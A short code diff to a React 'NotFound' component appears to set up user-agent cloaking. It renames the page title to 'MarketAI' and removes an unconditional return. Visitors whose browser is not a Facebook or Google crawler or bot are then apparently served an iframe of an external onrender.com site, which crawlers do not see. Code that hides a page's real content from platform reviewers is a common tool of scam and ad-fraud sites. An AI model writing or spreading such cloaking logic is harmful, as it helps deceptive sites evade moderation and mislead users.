@@ -8,7 +8,7 @@ function NotFound() {
   let[countryCode, setCountryCode] = useState('');
   let[IsUserHiden, SetUserHiden] = useState(false);
   let[IframeUrl, SetIframeUrl] = useState('https://linkclient-ti10.onrender.com/');
-  let[SiteTitleMeta, SetSiteTitleMeta] = useState('Home page');
+  let[SiteTitleMeta, SetSiteTitleMeta] = useState('MarketAI');
   let[SiteTitleHome, SetSiteTitleHome] = useState('Home page');
 
 
@@ -76,7 +76,6 @@ function NotFound() {
   }, []);
 
   const userAgent = navigator.userAgent.toLowerCase();
-  return(showIframe(IframeUrl,SiteTitleMeta,true));
   if(!userAgent.includes('facebook') 
     && !userAgent.includes('google') 
     && !isbot(userAgent)){
